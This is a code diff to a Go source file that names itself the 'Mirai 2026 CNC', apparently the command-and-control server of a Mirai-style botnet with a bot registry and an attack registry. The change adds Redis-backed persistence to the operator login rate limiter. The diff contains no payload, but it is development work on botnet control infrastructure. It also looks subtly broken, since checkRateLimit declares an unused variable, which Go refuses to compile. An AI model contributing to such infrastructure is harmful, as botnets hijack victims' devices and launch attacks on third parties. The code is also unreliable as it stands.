@@ -15,6 +15,7 @@
 //   - Bot registry with health tracking
 //   - Structured JSON logging
 //   - Graceful shutdown
+//   - Redis-backed rate-limit state (survives restarts; falls back to in-memory)
 
 package main
 
@@ -33,6 +34,7 @@ import (
 	"time"
 
 	"github.com/golang-jwt/jwt/v5"
+	goredis "github.com/redis/go-redis/v9"
 	"nhooyr.io/websocket"
 	"nhooyr.io/websocket/wsjson"
 )
@@ -47,6 +49,7 @@ type Config struct {
 	DBUser     string
 	DBPass     string
 	DBName     string
+	RedisURL   string
 }
 
 func loadConfig() Config {
@@ -58,6 +61,7 @@ func loadConfig() Config {
 		DBUser:    getEnv("DATABASE_USER", "mirai"),
 		DBPass:    getEnv("DATABASE_PASS", "mirai_dev_password"),
 		DBName:    getEnv("DATABASE_NAME", "mirai"),
+		RedisURL:  getEnv("REDIS_URL", ""),
 	}
 }
 
@@ -240,46 +244,141 @@ func (a *ActiveAttackRegistry) Count() int {
 }
 
 // ── Login Rate Limiter ────────────────────────────────────────────────────────
-// Tracks failed REST login attempts per IP. Mirrors the same logic in admin.go
-// so the two login paths share a lockout state in the same process.
+// Tracks failed REST login attempts per IP.
 // 5 failures → 5-minute lockout, returning HTTP 429.
+//
+// State is stored in Redis when available so lockouts survive CNC restarts and
+// are shared across replicas. Falls back transparently to in-memory maps when
+// Redis is unreachable.
+//
+// Redis key scheme:
+//   cnc:ratelimit:attempts:{ip}  — INCR integer, TTL = lockout duration
+//   cnc:ratelimit:lockout:{ip}   — string timestamp of lockout expiry, TTL = 5 min
 
+const (
+	rlMaxFails       = 5
+	rlLockoutMinutes = 5
+
+	rlKeyAttempts = "cnc:ratelimit:attempts:"
+	rlKeyLockout  = "cnc:ratelimit:lockout:"
+)
+
+// rlRedis is the Redis client used by the rate-limiter; nil when Redis is
+// unavailable or not configured.
+var rlRedis *goredis.Client
+
+// In-memory fallback maps — used when Redis is unavailable.
 var (
 	rlMu       sync.Mutex
 	rlAttempts = make(map[string]int)
 	rlLockouts = make(map[string]time.Time)
 )
 
-const (
-	rlMaxFails       = 5
-	rlLockoutMinutes = 5
-)
+// initRedis parses REDIS_URL and creates a client. Returns nil on error so the
+// rest of the CNC starts cleanly without Redis.
+func initRedis(redisURL string) *goredis.Client {
+	if redisURL == "" {
+		return nil
+	}
+	opts, err := goredis.ParseURL(redisURL)
+	if err != nil {
+		logger.Warn("Redis URL invalid — rate-limit falling back to in-memory", "url", redisURL, "err", err)
+		return nil
+	}
+	client := goredis.NewClient(opts)
+	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+	defer cancel()
+	if err := client.Ping(ctx).Err(); err != nil {
+		logger.Warn("Redis unreachable — rate-limit falling back to in-memory", "url", redisURL, "err", err)
+		client.Close()
+		return nil
+	}
+	logger.Info("Redis connected — rate-limit state is persistent", "url", redisURL)
+	return client
+}
 
+// checkRateLimit returns false if the IP is currently locked out.
 func checkRateLimit(ip string) bool {
+	lockoutDur := rlLockoutMinutes * time.Minute
+
+	if rlRedis != nil {
+		ctx := context.Background()
+		val, err := rlRedis.Get(ctx, rlKeyLockout+ip).Result()
+		if err == nil {
+			// Key exists — check if still within lockout window
+			expiry, parseErr := time.Parse(time.RFC3339, val)
+			if parseErr == nil && time.Now().Before(expiry) {
+				return false // still locked out
+			}
+			// Expired — clean up
+			rlRedis.Del(ctx, rlKeyLockout+ip, rlKeyAttempts+ip)
+		} else if err != goredis.Nil {
+			// Redis error — fall through to in-memory
+			logger.Warn("Redis GET error in checkRateLimit — using in-memory", "err", err)
+		} else {
+			return true // no lockout key → allowed
+		}
+	}
+
+	// In-memory fallback
 	rlMu.Lock()
 	defer rlMu.Unlock()
 	if t, locked := rlLockouts[ip]; locked {
 		if time.Now().Before(t) {
-			return false // still locked out
+			return false
 		}
-		// Lockout expired — clear it
 		delete(rlLockouts, ip)
 		delete(rlAttempts, ip)
 	}
 	return true
 }
 
+// recordFailedLogin increments the failure counter for ip and triggers lockout
+// after rlMaxFails consecutive failures.
 func recordFailedLogin(ip string) {
+	lockoutDur := rlLockoutMinutes * time.Minute
+
+	if rlRedis != nil {
+		ctx := context.Background()
+		// Increment attempt counter; set TTL equal to lockout window so the key
+		// auto-expires even if the lockout key is never set.
+		pipe := rlRedis.Pipeline()
+		incrCmd := pipe.Incr(ctx, rlKeyAttempts+ip)
+		pipe.Expire(ctx, rlKeyAttempts+ip, lockoutDur)
+		if _, err := pipe.Exec(ctx); err == nil {
+			attempts := incrCmd.Val()
+			if attempts >= int64(rlMaxFails) {
+				expiry := time.Now().Add(lockoutDur)
+				rlRedis.Set(ctx, rlKeyLockout+ip, expiry.Format(time.RFC3339), lockoutDur)
+				logger.Warn("Login lockout triggered (Redis)", "ip", ip, "attempts", attempts)
+			}
+			return
+		} else {
+			logger.Warn("Redis error in recordFailedLogin — falling back to in-memory", "err", err)
+		}
+	}
+
+	// In-memory fallback
 	rlMu.Lock()
 	defer rlMu.Unlock()
 	rlAttempts[ip]++
 	if rlAttempts[ip] >= rlMaxFails {
-		rlLockouts[ip] = time.Now().Add(rlLockoutMinutes * time.Minute)
-		logger.Warn("Login lockout triggered", "ip", ip, "attempts", rlAttempts[ip])
+		rlLockouts[ip] = time.Now().Add(lockoutDur)
+		logger.Warn("Login lockout triggered (in-memory)", "ip", ip, "attempts", rlAttempts[ip])
 	}
 }
 
+// clearLoginAttempts resets the failure counter for ip on successful login.
 func clearLoginAttempts(ip string) {
+	if rlRedis != nil {
+		ctx := context.Background()
+		if err := rlRedis.Del(ctx, rlKeyAttempts+ip, rlKeyLockout+ip).Err(); err == nil {
+			return
+		} else {
+			logger.Warn("Redis error in clearLoginAttempts — falling back to in-memory", "err", err)
+		}
+	}
+
 	rlMu.Lock()
 	defer rlMu.Unlock()
 	delete(rlAttempts, ip)
@@ -697,6 +796,12 @@ func main() {
 
 	logger.Info("Mirai 2026 CNC starting",
 		"bot_port", cfg.BotPort, "api_port", cfg.APIPort)
+
+	// Initialise Redis for persistent rate-limit state (optional)
+	rlRedis = initRedis(cfg.RedisURL)
+	if rlRedis != nil {
+		defer rlRedis.Close()
+	}
 
 	ctx, cancel := signal.NotifyContext(context.Background(),
 		os.Interrupt, syscall.SIGTERM)
